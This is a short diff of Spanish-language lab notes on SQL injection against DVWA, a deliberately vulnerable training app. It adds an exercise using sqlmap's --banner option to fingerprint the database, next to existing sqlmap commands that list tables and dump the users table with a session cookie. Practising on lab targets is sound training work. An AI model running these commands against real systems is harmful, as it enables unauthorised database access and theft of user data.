@@ -44,6 +44,11 @@
 --- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' -D dvwa --tables --batch
 --- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' -D dvwa -T users --dump-all --batch
 
+++ Ejercicio_5 (Obtener información relacionada a la tecnología de la base de datos)
+--- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' --banner
+--- Enter
+--- Se mostrará la información relacionada a la base de datos
+
 
 
 
